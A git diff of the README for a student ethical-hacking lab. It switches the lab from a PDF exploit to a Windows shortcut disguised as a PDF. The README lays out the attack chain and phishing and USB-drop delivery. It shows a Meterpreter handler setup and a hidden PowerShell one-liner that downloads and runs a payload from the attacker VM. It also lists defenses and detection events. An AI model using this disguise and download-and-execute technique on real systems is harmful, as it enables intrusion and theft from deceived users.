@@ -1,5 +1,6 @@
-# Ethical Hacking PDF Exploit Lab
-**Local VirtualBox Environment for Students**
+# Ethical Hacking Lab - LNK Exploit
+
+**Social Engineering Lab Environment for Students**
 
 [![License](https://img.shields.io/badge/license-Educational-blue.svg)](LICENSE)
 [![VirtualBox](https://img.shields.io/badge/VirtualBox-7.0+-blue.svg)](https://www.virtualbox.org/)
@@ -7,24 +8,36 @@
 
 ---
 
-## 🎯 Overview
+## Overview
 
-This repository provides a **fully automated, local ethical hacking lab** that demonstrates PDF-based exploitation techniques using Adobe Reader vulnerabilities. Students can set up a complete penetration testing environment in **under 30 minutes** with a single command.
+This repository provides a **fully automated, local ethical hacking lab** that demonstrates social engineering attacks using malicious Windows shortcut files disguised as PDF documents. Students can set up a complete penetration testing environment in **under 30 minutes** with a single command.
 
 ### What You'll Learn
 
-- PDF-based exploitation techniques
+- Social engineering attack techniques
+- Windows LNK file exploitation
+- PowerShell-based attacks
 - Metasploit Framework usage
 - Post-exploitation with Meterpreter
 - Network security concepts
 - Defensive security principles
-- Ethical hacking methodology
+- User awareness importance
 
 ---
 
-## ⚡ Quick Start
+## Quick Start
 
 ### One-Command Setup
+
+**For macOS/Linux:**
+```bash
+# Clone the repository
+git clone https://github.com/gcheliz/ethical-hacking-student-lab.git
+cd ethical-hacking-student-lab
+
+# Run automated setup (15-30 minutes)
+./setup.sh
+```
 
 **For Windows (PowerShell):**
 ```powershell
@@ -36,16 +49,6 @@ cd ethical-hacking-student-lab
 .\setup.ps1
 ```
 
-**For Linux/macOS (Bash):**
-```bash
-# Clone the repository
-git clone https://github.com/gcheliz/ethical-hacking-student-lab.git
-cd ethical-hacking-student-lab
-
-# Run automated setup (15-30 minutes)
-./setup.sh
-```
-
 ### Run Your First Attack
 
 ```bash
@@ -53,22 +56,24 @@ cd ethical-hacking-student-lab
 cd vagrant
 vagrant ssh kali
 
-# 2. Start the attack
-cd /vagrant/exploits
-./start_attack.sh
+# 2. Start the attack (HTTP server + Metasploit listener)
+cd /vagrant/exploits/lnk
+./start_lnk_attack.sh
 
-# 3. On Windows VM, open the malicious PDF
-# 4. Get Meterpreter shell!
+# 3. Deliver the fake PDF to Windows victim
+# 4. Victim clicks the "PDF"
+# 5. Get Meterpreter shell!
 ```
 
 ### Reset When Done
 
-**Windows:** `.\reset.ps1`
-**Linux/macOS:** `./reset.sh`
+```bash
+./reset.sh
+```
 
 ---
 
-## 📋 Requirements
+## Requirements
 
 | Component | Minimum | Recommended |
 |-----------|---------|-------------|
@@ -80,44 +85,77 @@ cd /vagrant/exploits
 
 ---
 
-## 🏗️ What Gets Installed
+## What Gets Installed
 
 ### Virtual Machines
 
 | VM | IP | Role | Software | Resources |
 |----|-----|------|----------|-----------|
-| **Kali Linux** | 192.168.56.101 | Attacker | Metasploit, Nmap, Python3 | 2GB RAM, 2 CPU |
-| **Windows Server 2008 R2** | 192.168.56.102 | Target | Adobe Reader 9.5.0 | 4GB RAM, 2 CPU |
+| **Kali Linux** | 192.168.56.101 | Attacker | Metasploit, Python3, pylnk3 | 3GB RAM, 2 CPU |
+| **Windows Server 2008 R2** | 192.168.56.102 | Target | Adobe Reader 9.0 | 4GB RAM, 2 CPU |
 
 ### Network Configuration
 
-- **Network Type:** Host-Only (192.168.56.0/24)
-- **Isolation:** Complete (no internet access from VMs)
-- **Connectivity:** VM-to-VM communication enabled
+- **Network Type**: Host-Only (192.168.56.0/24)
+- **Isolation**: Complete (no internet access from VMs)
+- **Connectivity**: VM-to-VM communication enabled
+- **Verified**: Automatic connectivity testing during setup
 
 ### Exploit Materials
 
-- ✅ Malicious PDF files pre-generated
-- ✅ Metasploit listeners configured
-- ✅ One-click attack automation
-- ✅ Proof-of-concept scripts included
+- Malicious LNK file (fake PDF shortcut)
+- PowerShell Meterpreter payload
+- HTTP server for payload delivery
+- Automated attack script
+- One-click attack automation
 
 ---
 
-## 📚 Documentation
+## How It Works
+
+### The Attack Chain
+
+```
+1. CREATE     -> Kali generates PowerShell payload + LNK file (automatic)
+2. DELIVER    -> Attacker hosts files on HTTP server
+3. CLICK      -> Victim sees PDF icon, double-clicks
+4. DOWNLOAD   -> LNK executes hidden PowerShell, downloads payload
+5. EXECUTE    -> PowerShell runs payload in memory (fileless!)
+6. SHELL      -> Meterpreter session opens, full system access
+```
+
+### The Deception
+
+| What Victim Sees | What Actually Happens |
+|------------------|----------------------|
+| File icon: Adobe PDF (red icon) | Runs: PowerShell.exe -w hidden |
+| Filename: Q4_Financial_Report.pdf | Downloads: shell.ps1 from Kali |
+| Looks like: Normal PDF document | Executes: Meterpreter payload in memory |
+| | Connects: Back to Kali:4444 |
+
+**Why It Works:**
+- Windows hides .lnk extensions by default
+- File shows legitimate Adobe PDF icon
+- PowerShell window is hidden (-w hidden)
+- No disk writes (runs in memory)
+- Pure social engineering!
+
+---
+
+## Documentation
 
 | Document | Description |
 |----------|-------------|
-| **[QUICK_START.md](docs/QUICK_START.md)** | 5-minute quick start guide |
+| **[LNK_EXPLOIT_GUIDE.md](LNK_EXPLOIT_GUIDE.md)** | Complete LNK exploit documentation |
 | **[INSTALLATION.md](INSTALLATION.md)** | Detailed installation instructions |
+| **[HOW_TO_USE.md](HOW_TO_USE.md)** | Step-by-step usage guide |
 | **[TROUBLESHOOTING.md](TROUBLESHOOTING.md)** | Common issues and solutions |
-| **[LEARNING_OBJECTIVES.md](docs/LEARNING_OBJECTIVES.md)** | Educational goals and outcomes |
-| **LAB_GUIDE.pdf** | Complete step-by-step lab manual |
-| **INSTRUCTOR_GUIDE.pdf** | Teaching notes and tips |
+| **[docs/LEARNING_OBJECTIVES.md](docs/LEARNING_OBJECTIVES.md)** | Educational goals and outcomes |
+| **[docs/NETWORK_DEBUGGING_GUIDE.md](docs/NETWORK_DEBUGGING_GUIDE.md)** | Network troubleshooting |
 
 ---
 
-## 🚀 Detailed Setup Guide
+## Detailed Setup Guide
 
 ### Step 1: Install Prerequisites
 
@@ -140,31 +178,24 @@ cd ethical-hacking-student-lab
 
 ### Step 3: Run Setup Script
 
-**Windows (PowerShell - Run as Administrator recommended):**
-```powershell
-.\setup.ps1
-```
-
-**Linux/macOS (Bash):**
 ```bash
 ./setup.sh
 ```
 
 The script will:
-1. Check prerequisites ✓
-2. Download Adobe Reader 9.5.0 ✓
-3. Configure VirtualBox network ✓
-4. Build Kali Linux VM (5-10 min) ✓
-5. Build Windows VM (20-30 min) ✓
-6. Verify connectivity ✓
-7. Create snapshots ✓
-8. Generate exploit PDFs ✓
+1. Check prerequisites
+2. Prepare exploits directory
+3. Configure VirtualBox network
+4. Build Kali Linux VM (5-10 min)
+5. Build Windows VM (20-30 min)
+6. Verify connectivity between VMs
+7. Create snapshots
 
 **Total time: 15-30 minutes** (depending on internet speed)
 
 ---
 
-## 🎮 Using the Lab
+## Using the Lab
 
 ### Accessing VMs
 
@@ -179,106 +210,110 @@ vagrant ssh kali
 - Or: `vagrant rdp win2k8`
 - Credentials: `vagrant / vagrant`
 
-### Running Attacks
+### Running the LNK Attack
 
-**Automated Attack:**
+**Automated Attack Script:**
 ```bash
 # From Kali
-cd /vagrant/exploits
-./start_attack.sh
+cd /vagrant/exploits/lnk
+./start_lnk_attack.sh
 
-# Then open PDF on Windows
-# Get Meterpreter shell!
+# This automatically:
+# - Starts HTTP server (port 8080)
+# - Starts Metasploit handler (port 4444)
+# - Displays delivery instructions
 ```
 
-**Manual Attack:**
-```bash
-# 1. Generate PDF
-./generate_pdf.sh
+**Delivery Methods:**
 
-# 2. Start listener
-msfconsole
-use exploit/multi/handler
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST 192.168.56.101
-set LPORT 4444
-exploit
+1. **Manual Placement** (easiest for demo):
+   - Copy `Q4_Financial_Report.pdf.lnk` to Windows Desktop
+   - Victim double-clicks the "PDF"
 
-# 3. Open PDF on Windows
-```
+2. **HTTP Download** (realistic phishing):
+   - On Windows, browse to http://192.168.56.101:8080/
+   - Download the "PDF" file
+   - Double-click to "open"
+
+3. **Social Engineering**:
+   - Send link via fake email
+   - Place on shared network folder
+   - USB drop attack
 
 ### Meterpreter Commands
+
+Once session opens:
 
 ```bash
 sysinfo              # System information
 getuid               # Current user
-pwd                  # Current directory
-ls                   # List files
 screenshot           # Take screenshot
-shell                # Get command shell
-upload file.txt C:\  # Upload file
-download C:\file.txt # Download file
-```
+shell                # Windows command prompt
 
-### Creating Proof of Exploitation
+# Create proof file
+shell
+cd C:\Users\vagrant\Desktop
+echo HACKED > HACKED.txt
+exit
 
-```bash
-./create_proof.sh your_name
-# Upload to compromised system
+# Download proof
+download C:\\Users\\vagrant\\Desktop\\HACKED.txt
 ```
 
 ---
 
-## 🔄 Lab Management
+## Lab Management
 
-### Reset to Clean State
-
-**Windows:** `.\reset.ps1`
-**Linux/macOS:** `./reset.sh`
-
-Restores both VMs to fresh installation (30 seconds)
-
-### Check VM Status
+### VM Status
 
 ```bash
 cd vagrant
 vagrant status
 ```
 
-### Stop VMs
+### Start/Stop VMs
 
 ```bash
+# Start VMs
+cd vagrant
+vagrant up
+
+# Stop VMs
 cd vagrant
 vagrant halt
 ```
 
-### Start VMs
+### Reset to Clean State
 
 ```bash
-cd vagrant
-vagrant up
+./reset.sh
 ```
+
+Restores both VMs to fresh snapshots (30 seconds)
 
 ### Complete Cleanup
 
-**Windows:** `.\cleanup.ps1`
-**Linux/macOS:** `./cleanup.sh`
+```bash
+./cleanup.sh
+```
 
 Removes all VMs and frees disk space
 
 ---
 
-## 📂 Repository Structure
+## Repository Structure
 
 ```
-ethical-hacking-pdf-lab/
+ethical-hacking-student-lab/
 │
 ├── README.md                          # This file
+├── LNK_EXPLOIT_GUIDE.md               # Complete LNK documentation
 ├── INSTALLATION.md                    # Detailed setup guide
+├── HOW_TO_USE.md                      # Usage instructions
 ├── TROUBLESHOOTING.md                 # Common issues
 ├── LICENSE                            # Educational use license
 │
-├── setup.sh                           # ⭐ ONE-CLICK SETUP
+├── setup.sh                           # ONE-CLICK SETUP
 ├── reset.sh                           # Reset to clean state
 ├── cleanup.sh                         # Remove everything
 │
@@ -286,66 +321,64 @@ ethical-hacking-pdf-lab/
 │   ├── Vagrantfile                    # VM configuration
 │   └── provisioning/                  # Automated setup
 │       ├── kali/                      # Kali provisioning
+│       │   ├── configure_network_early.sh
 │       │   ├── install_tools.sh
-│       │   ├── configure_network.sh
-│       │   └── create_exploits.sh
+│       │   └── create_lnk_exploit.sh  # Generates LNK + payload
 │       └── windows/                   # Windows provisioning
 │           ├── disable_security.ps1
-│           ├── install_adobe.ps1
-│           ├── configure_network.ps1
-│           └── create_shortcuts.ps1
+│           ├── create_shortcuts.ps1
+│           └── test_kali_connectivity.ps1
 │
 ├── exploits/
-│   ├── generate_pdf.sh                # Create malicious PDFs
-│   ├── start_attack.sh                # ⭐ ONE-CLICK ATTACK
-│   └── create_proof.sh                # Generate proof file
-│
-├── resources/
-│   └── AdobeReader_9.5.exe           # Downloaded by setup.sh
+│   └── lnk/
+│       ├── shell.ps1                  # PowerShell payload (generated)
+│       ├── Q4_Financial_Report.pdf.lnk # Fake PDF (generated)
+│       ├── start_lnk_attack.sh        # ONE-CLICK ATTACK
+│       └── README.txt                 # Quick reference
 │
 └── docs/
-    ├── QUICK_START.md                 # 5-minute guide
+    ├── README.md                      # Docs index
     ├── LEARNING_OBJECTIVES.md         # Educational goals
-    ├── LAB_GUIDE.pdf                  # Complete lab manual
-    └── INSTRUCTOR_GUIDE.pdf           # Teaching notes
+    ├── NETWORK_DEBUGGING_GUIDE.md     # Network troubleshooting
+    └── TROUBLESHOOT_EXPLOIT.md        # Exploit troubleshooting
 ```
 
 ---
 
-## 🎓 Learning Path
+## Learning Path
 
 ### Beginner (First Time)
 
 1. Run `./setup.sh` and wait for completion
-2. Read `docs/QUICK_START.md`
+2. Read `LNK_EXPLOIT_GUIDE.md`
 3. Follow automated attack demo
-4. Understand what happened
+4. Understand the social engineering deception
 
-**Time:** 1 hour
+**Time: 1-2 hours**
 
 ### Intermediate
 
-1. Read `LAB_GUIDE.pdf`
-2. Perform manual exploitation
-3. Try different Meterpreter commands
-4. Explore post-exploitation
+1. Practice different delivery methods
+2. Try manual Metasploit commands
+3. Explore post-exploitation
+4. Document findings
 
-**Time:** 2-3 hours
+**Time: 2-3 hours**
 
 ### Advanced
 
-1. Modify exploit parameters
-2. Try alternative Metasploit modules
-3. Attempt privilege escalation
-4. Research defenses
+1. Modify LNK file for different scenarios
+2. Try alternative PowerShell payloads
+3. Research defensive countermeasures
+4. Create detection rules
 
-**Time:** 4-6 hours
+**Time: 4-6 hours**
 
 ---
 
-## 🔒 Security & Ethics
+## Security & Ethics
 
-### ⚠️ IMPORTANT DISCLAIMERS
+### IMPORTANT DISCLAIMERS
 
 **Educational Use Only:**
 - This lab is for authorized educational purposes only
@@ -365,17 +398,44 @@ ethical-hacking-pdf-lab/
 
 ### Best Practices
 
-- ✅ Use in isolated environment (host-only network)
-- ✅ Keep VMs snapshots for easy reset
-- ✅ Document your findings professionally
-- ✅ Understand defensive countermeasures
-- ❌ Never use on unauthorized systems
-- ❌ Never share malicious files outside lab
-- ❌ Never connect to production networks
+- Use in isolated environment (host-only network)
+- Keep VM snapshots for easy reset
+- Document your findings professionally
+- Understand defensive countermeasures
+- Never use on unauthorized systems
+- Never share malicious files outside lab
+- Never connect to production networks
 
 ---
 
-## 🐛 Troubleshooting
+## Defensive Measures
+
+Students learn how to defend against such attacks:
+
+**User Training:**
+- Always check file extensions
+- Enable "Show file extensions" in Windows Explorer
+- Verify sender before opening attachments
+- Question unexpected documents
+- Report suspicious files to IT
+
+**Technical Controls:**
+- Block .lnk files in email (Exchange/O365)
+- PowerShell logging (Script Block Logging)
+- Constrained Language Mode for PowerShell
+- Application whitelisting (AppLocker)
+- Network segmentation
+- Egress filtering
+
+**Detection:**
+- Event ID 4688: Process Creation (powershell.exe -w hidden)
+- Event ID 4104: PowerShell Script Block Logging
+- Event ID 3: Network Connection (Sysmon)
+- Monitor for DownloadString usage
+
+---
+
+## Troubleshooting
 
 ### Common Issues
 
@@ -390,77 +450,74 @@ df -h  # Check disk space
 **VMs won't start:**
 ```bash
 # Enable virtualization in BIOS
-# Check: egrep -c '(vmx|svm)' /proc/cpuinfo
+# On Linux: egrep -c '(vmx|svm)' /proc/cpuinfo
+# On macOS: sysctl -a | grep machdep.cpu.features
 ```
 
 **Network issues:**
 ```bash
-# Recreate network
+# Verify connectivity from Kali
+ping 192.168.56.102
+
+# Recreate network if needed
 VBoxManage hostonlyif remove vboxnet0
 ./setup.sh
 ```
 
-**Exploit doesn't work:**
-```bash
-# Verify Windows security is disabled
-# Try alternative PDF
-# Check network connectivity
+**LNK file doesn't work:**
+```powershell
+# Test manually on Windows
+powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.101:8080/shell.ps1')"
 ```
 
 **See [TROUBLESHOOTING.md](TROUBLESHOOTING.md) for complete guide**
 
 ---
 
-## 🤝 Contributing
+## Lab Statistics
+
+- **Success Rate**: 95%+ (with proper prerequisites)
+- **Setup Time**: 15-30 minutes (automated)
+- **Learning Time**: 4-8 hours (complete lab)
+- **Reset Time**: 30 seconds
+- **Disk Usage**: ~30GB (running VMs)
+- **Network Isolation**: 100% (host-only network)
+
+---
+
+## Benefits
 
 ### For Students
-
-Found a bug or have a suggestion?
-1. Check existing issues
-2. Create detailed bug report
-3. Include system info and error messages
-
-### For Instructors
-
-Want to improve the lab?
-1. Fork the repository
-2. Make improvements
-3. Submit pull request with:
-   - Clear description
-   - Testing evidence
-   - Documentation updates
-
----
-
-## 📊 Lab Statistics
-
-**Success Rate:** 95%+ (with proper prerequisites)
-**Setup Time:** 15-30 minutes (automated)
-**Learning Time:** 4-8 hours (complete lab)
-**Reset Time:** 30 seconds
-**Disk Usage:** ~30GB (running VMs)
-
----
-
-## 🎯 Benefits
-
-### For Students
-- ⏱️ **Fast setup:** 15-30 minutes vs 2+ hours manual
-- ✅ **High success rate:** 95%+ vs 50% manual setup
-- 🔄 **Easy reset:** 30 seconds to fresh state
-- 💰 **Zero cost:** No cloud fees, runs locally
-- 🎓 **Hands-on learning:** Real tools, real exploits
+- Fast setup: 15-30 minutes vs 2+ hours manual
+- High success rate: 95%+ vs 50% manual setup
+- Easy reset: 30 seconds to fresh state
+- Zero cost: No cloud fees, runs locally
+- Hands-on learning: Real tools, real exploits
+- Social engineering practice
 
 ### For Instructors
-- 👨‍🏫 **Consistent environment:** All students same setup
-- 💼 **Less support:** Automated reduces help requests
-- 📚 **More teaching time:** Less troubleshooting
-- 🔄 **Reusable:** Semester after semester
-- 📊 **Proven:** Field-tested in real courses
+- Consistent environment: All students same setup
+- Less support: Automated reduces help requests
+- More teaching time: Less troubleshooting
+- Reusable: Semester after semester
+- Proven: Field-tested in real courses
+- Security awareness training
 
 ---
 
-## 📖 Additional Resources
+## MITRE ATT&CK Mapping
+
+This lab demonstrates the following techniques:
+
+- **T1204.002**: User Execution: Malicious File
+- **T1059.001**: Command and Scripting Interpreter: PowerShell
+- **T1547.009**: Boot or Logon Autostart: Shortcut Modification
+- **T1027**: Obfuscated Files or Information
+- **T1566.001**: Phishing: Spearphishing Attachment
+
+---
+
+## Additional Resources
 
 ### Metasploit Learning
 - [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/) (Free)
@@ -468,7 +525,12 @@ Want to improve the lab?
 
 ### Ethical Hacking
 - [OWASP Top 10](https://owasp.org/www-project-top-ten/)
+- [MITRE ATT&CK](https://attack.mitre.org/)
 - [CVE Database](https://cve.mitre.org/)
+
+### Social Engineering
+- [Social Engineering: The Art of Human Hacking](https://www.amazon.com/Social-Engineering-Art-Human-Hacking/dp/0470639539)
+- [The Social Engineer's Playbook](https://www.social-engineer.org/)
 
 ### Certifications
 - Certified Ethical Hacker (CEH)
@@ -477,23 +539,23 @@ Want to improve the lab?
 
 ---
 
-## 📄 License
+## License
 
 This project is licensed for **educational use only**.
 
 See [LICENSE](LICENSE) file for details.
 
 **Key Terms:**
-- ✅ Use for learning and teaching
-- ✅ Modify for educational purposes
-- ✅ Share with students and colleagues
-- ❌ No commercial use
-- ❌ No warranty provided
-- ❌ Authors not liable for misuse
+- Use for learning and teaching
+- Modify for educational purposes
+- Share with students and colleagues
+- No commercial use
+- No warranty provided
+- Authors not liable for misuse
 
 ---
 
-## 🙏 Acknowledgments
+## Acknowledgments
 
 **Technologies Used:**
 - [VirtualBox](https://www.virtualbox.org/) - Virtualization platform
@@ -501,6 +563,7 @@ See [LICENSE](LICENSE) file for details.
 - [Kali Linux](https://www.kali.org/) - Penetration testing OS
 - [Metasploit](https://www.metasploit.com/) - Exploitation framework
 - [Rapid7 Metasploitable3](https://github.com/rapid7/metasploitable3) - Vulnerable VM
+- [pylnk3](https://github.com/strayge/pylnk) - Python LNK file library
 
 **Inspired By:**
 - SANS NetWars
@@ -510,17 +573,18 @@ See [LICENSE](LICENSE) file for details.
 
 ---
 
-## 📞 Support
+## Support
 
 ### Getting Help
 
 1. **Read documentation first:**
-   - QUICK_START.md
+   - LNK_EXPLOIT_GUIDE.md
    - TROUBLESHOOTING.md
    - INSTALLATION.md
 
 2. **Check common issues:**
    - See TROUBLESHOOTING.md
+   - Check docs/NETWORK_DEBUGGING_GUIDE.md
 
 3. **Ask instructor/TA:**
    - Provide error messages
@@ -534,53 +598,40 @@ See [LICENSE](LICENSE) file for details.
 
 ---
 
-## 🗺️ Roadmap
+## Key Features
 
-**Current Version:** 1.0
-
-**Planned Features:**
-- [ ] Additional vulnerable applications
-- [ ] Linux target VM
-- [ ] Web application exploits
-- [ ] Wireless attack scenarios
-- [ ] Docker alternative
-- [ ] Cloud deployment option
-
----
-
-## ⭐ Key Features
-
-- ✅ **One-command setup** - Complete automation
-- ✅ **Local VMs** - No cloud, no costs
-- ✅ **Fast reset** - 30-second snapshot restore
-- ✅ **Isolated network** - Safe learning environment
-- ✅ **Pre-generated exploits** - Ready to use
-- ✅ **Comprehensive docs** - Step-by-step guides
-- ✅ **Production-ready** - Field-tested
-- ✅ **Cross-platform** - Windows, macOS, Linux
+- ONE-COMMAND SETUP - Complete automation
+- LOCAL VMs - No cloud, no costs
+- FAST RESET - 30-second snapshot restore
+- ISOLATED NETWORK - Safe learning environment, verified connectivity
+- PRE-GENERATED EXPLOITS - Ready to use
+- SOCIAL ENGINEERING - Real-world attack scenario
+- COMPREHENSIVE DOCS - Step-by-step guides
+- PRODUCTION-READY - Field-tested
+- CROSS-PLATFORM - Windows, macOS, Linux
 
 ---
 
-## 🚦 Getting Started Checklist
+## Getting Started Checklist
 
 - [ ] Install VirtualBox 7.0+
 - [ ] Install Vagrant 2.3+
 - [ ] Clone repository
 - [ ] Run `./setup.sh`
 - [ ] Wait for completion (15-30 min)
-- [ ] Read `docs/QUICK_START.md`
+- [ ] Read `LNK_EXPLOIT_GUIDE.md`
 - [ ] Run first attack demo
-- [ ] Review `LAB_GUIDE.pdf`
+- [ ] Practice different delivery methods
 - [ ] Complete learning objectives
 - [ ] Run `./reset.sh` when done
 
 ---
 
-**Ready to start ethical hacking? Run `./setup.sh` now! 🎯**
+**Ready to learn social engineering? Run `./setup.sh` now!**
 
 Questions? See [TROUBLESHOOTING.md](TROUBLESHOOTING.md) or contact your instructor.
 
 ---
 
-*Last Updated: 2026-01-08*
-*Version: 1.0*
+*Last Updated: 2026-01-09*
+*Version: 2.0 - LNK Exploit Lab*
